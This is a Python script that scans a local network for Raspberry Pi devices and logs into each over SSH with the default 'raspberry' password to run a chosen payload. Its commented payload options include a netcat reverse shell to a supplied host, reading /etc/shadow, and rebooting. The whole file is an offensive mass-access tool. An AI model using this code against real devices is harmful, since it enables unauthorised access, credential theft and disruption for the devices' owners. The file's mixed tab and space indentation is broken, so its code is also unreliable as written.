#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import argparse
from termcolor import colored, cprint

parser = argparse.ArgumentParser()
parser.add_argument('--no-scan', dest='no_scan', action='store_true',
                    help='Disable scanning')

parser.add_argument('-r', '--ip_range', type=str, default='--localnet',
                    help='IP range to scan')
parser.add_argument('-f', '--ip_list', type=str, default='./scan/RPI_list',
                    help='IP list to use (Default ./scan/RPI_list)')

parser.add_argument('-c', '--creds', type=str, default='raspberry',
                    help='Password to use when ssh\'ing')
parser.add_argument('-H', '--host', type=str,
                    help='(If using reverse shell payload) Host for reverse shell')
parser.add_argument('-P', '--port', type=str,
                    help='(If using reverse shell payload) Port for reverse shell')

parser.add_argument('--safe', action='store_true',
		   help='Print sshpass command, but don\'t execute it')
args = parser.parse_args()

#TODO: Need to organize payloads in a better way than just commented lines. Ideas welcome!

#payload= 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+args.host+" "+args.port+" >/tmp/f'
payload= 'whoami'
#payload= 'echo "raspberry" | sudo -S whoami'
#payload= '"sudo apt update && sudo apt -y upgrade"'
#payload= "sudo apt -y install git python-pip"
#payload= 'sudo apt -y install fortune cowsay lolcat'
#payload= 'sudo whoami && fortune | cowsay | lolcat'
#payload= 'sudo cat /etc/shadow'
#payload= 'sudo reboot'


def RPI():
	if not args.no_scan and not args.safe:
		os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap')
                os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
                os.system('cat ./scan/pcap.txt | grep -i "Rasp" > ./scan/raspi_list')
                os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/RPI_list')
                os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
                cprint('\nLocated '+ str(sum(1 for line in open ('./scan/RPI_list'))) + ' Raspi\'s', 'yellow')

	if args.safe:
        	raw_input('\nPress enter to continue')

	cprint('\nLoaded '+ str(sum(1 for line in open (args.ip_list))) + ' IP\'s\n\n', 'yellow')

        list = args.ip_list
        with open(list) as inf:
                lines = [line.strip() for line in inf]
        i=0
	cprint("Sending payload to Pi\'s", "yellow")
	cprint("Godspeed, little payloads\n", "green")

        while i < len(lines):
		cprint("Sending payload to "+lines[i], "yellow")
		if args.safe:
			print("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no pi@"+lines[i]+" "+payload)
		else:
			os.system("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no pi@"+lines[i]+" "+payload)
			print("\n")
		i+=1
	exit
RPI()
